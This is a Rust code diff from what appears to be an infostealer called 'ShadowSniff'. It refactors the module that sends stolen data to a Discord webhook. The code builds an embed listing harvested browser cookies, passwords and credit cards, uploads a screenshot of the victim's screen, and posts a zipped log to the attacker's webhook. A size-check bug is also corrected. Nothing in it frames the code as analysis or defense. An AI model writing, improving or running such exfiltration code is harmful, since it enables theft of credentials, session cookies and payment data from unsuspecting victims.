@@ -38,7 +38,8 @@ where
     if let Some(p) = password { parts.push(p); }
     let description = if parts.is_empty() { "".to_string() } else { parts.join("\\n") };
 
-    formatdoc! {r#"
+    formatdoc! {
+        r#"
         {{
           "title": "New log",
           "description": "{description}",
@@ -73,8 +74,7 @@ where
           "footer": {{
             "text": "ShadowSniff"
           }}
-        }}
-        "#,
+        }}"#,
         cookies = collector.get_browser().get_cookies(),
         passwords = collector.get_browser().get_passwords(),
         credit_cards = collector.get_browser().get_credit_cards(),
@@ -99,25 +99,8 @@ where
     }
 }
 
-impl LogSender for DiscordWebhook {
-    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
-    where
-        P: AsRef<str> + Clone,
-        C: Collector
-    {
-        if let LogFile::ZipArchive(archive) = &log_file
-            && archive.len() == 8 * 1024 * 1024 // 8 MB
-        {
-            return Err(SendError::LogFileTooBig)
-        }
-
-        let mut builder = MultipartBuilder::new("----Multipart");
-        if let Some(screenshot) = collector.get_device().get_screenshot() {
-            builder.write_file_field("file", "screenshot.png", "image/png", &screenshot);
-        }
-
-        builder.write_text_field("payload_json", r#"{"content": ""}"#);
-
+impl DiscordWebhook {
+    fn send_multipart(&self, builder: MultipartBuilder) -> Result<(), SendError> {
         let content_type = builder.content_type();
         let body = builder.finish();
 
@@ -129,14 +112,36 @@ impl LogSender for DiscordWebhook {
             .ok()
             .ok_or(SendError::Network)?;
 
-        let payload = formatdoc! {r#"
-            {{
+        Ok(())
+    }
+}
+
+impl LogSender for DiscordWebhook {
+    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+    where
+        P: AsRef<str> + Clone,
+        C: Collector
+    {
+        if let LogFile::ZipArchive(archive) = &log_file
+            && archive.len() >= 8 * 1024 * 1024 // 8 MB
+        {
+            return Err(SendError::LogFileTooBig)
+        }
+
+        if let Some(screenshot) = collector.get_device().get_screenshot() {
+            let mut builder = MultipartBuilder::new("----Multipart");
+            builder.write_file_field("file", "screenshot.png", "image/png", &screenshot);
+            builder.write_text_field("payload_json", r#"{"content": ""}"#);
+            self.send_multipart(builder)?;
+        }
+
+        let payload = formatdoc! {
+            r#"{{
                 "content": "",
                 "embeds": [
                     {embed}
                 ]
-            }}
-            "#,
+            }}"#,
             embed = generate_embed(&log_file, password, collector),
         };
 
@@ -146,17 +151,7 @@ impl LogSender for DiscordWebhook {
         }
 
         builder.write_text_field("payload_json", &payload);
-
-        let content_type = builder.content_type();
-        let body = builder.finish();
-
-        Request::post(self.webhook.to_string())
-            .header("Content-Type", &content_type)
-            .body(body)
-            .build()
-            .send()
-            .ok()
-            .ok_or(SendError::Network)?;
+        self.send_multipart(builder)?;
 
         Ok(())
     }
